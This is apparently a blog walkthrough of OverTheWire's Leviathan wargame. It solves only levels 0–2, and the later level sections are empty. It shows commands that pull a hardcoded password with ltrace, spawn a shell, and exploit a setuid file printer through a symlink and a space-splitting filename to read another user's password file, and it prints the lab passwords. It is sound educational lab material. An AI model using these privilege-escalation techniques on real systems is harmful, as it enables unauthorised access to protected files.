---
layout: single
title: "OverTheWire: 'Leviathan' Solutions 1-8"
header:
  teaser: oth.png
  overlay_image: ZenBG.png
  caption: "[__OverTheWire__](http://overthewire.org/wargames/)"
related: true
comments: true
---

### Level 0:
For the first level we must log into leviathan, so we will SHH to leviathan0 with the username: __leviathan0__ and password: __leviathan0__

```console
root@kali:~# ssh leviathan0@leviathan.labs.overthewire.org
```

OverTheWire provides us only with one hint "Data for the levels can be found in the __homedirectories__." So we are on our own!

```console
leviathan0@melinda:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
leviathan0@melinda:~$ cd .backup
leviathan0@melinda:~/.backup$ ls -a
.  ..  bookmarks.html
leviathan0@melinda:~/.backup$ grep leviathan1 bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

### Level 0 -> 1:

```console
leviathan1@melinda:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  check
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 <unfinished ...>
printf("password: ")                             = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: 
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642
)     = 10
strcmp("\n\n\n", "sex")                          = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)             = 29
+++ exited (status 0) +++
leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

### Level 1 -> 2:

```console
leviathan2@melinda:~$ ls -la
total 28
drwxr-xr-x   2 root       root       4096 Nov 14  2014 .
drwxr-xr-x 172 root       root       4096 Jul 10 14:12 ..
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
leviathan2@melinda:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@melinda:~$ mkdir /tmp/jhalon && touch /tmp/jhalon/pass\ file.txt
leviathan2@melinda:~$ cd /tmp/jhalon
leviathan2@melinda:/tmp/jhalon$ ltrace ~/printfile "pass file.txt"
__libc_start_main(0x804852d, 2, 0xffffd744, 0x8048600 <unfinished ...>
access("pass file.txt", 4)                       = 0
snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 256
+++ exited (status 0) +++
leviathan2@melinda:/tmp/jhalon$ ln -s /etc/leviathan_pass/leviathan3 /tmp/jhalon/pass
leviathan2@melinda:/tmp/jhalon$ ls -la
total 7864
drwxrwxr-x 2 leviathan2 leviathan2    4096 Sep 10 04:55 .
drwxrwx-wt 1 root       root       8036352 Sep 10 04:55 ..
lrwxrwxrwx 1 leviathan2 leviathan2      30 Sep 10 04:55 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2       0 Sep 10 04:54 pass file.txt
leviathan2@melinda:/tmp/jhalon$ ~/printfile "pass file.txt"
Ahdiemoo1j
/bin/cat: file.txt: No such file or directory
```

### Level 2 -> 3:

```console

```

### Level 3 -> 4:

```console

```

### Level 4 -> 5:

```console

```

### Level 5 -> 6:

```console

```

### Level 6 -> 7:

```console

```
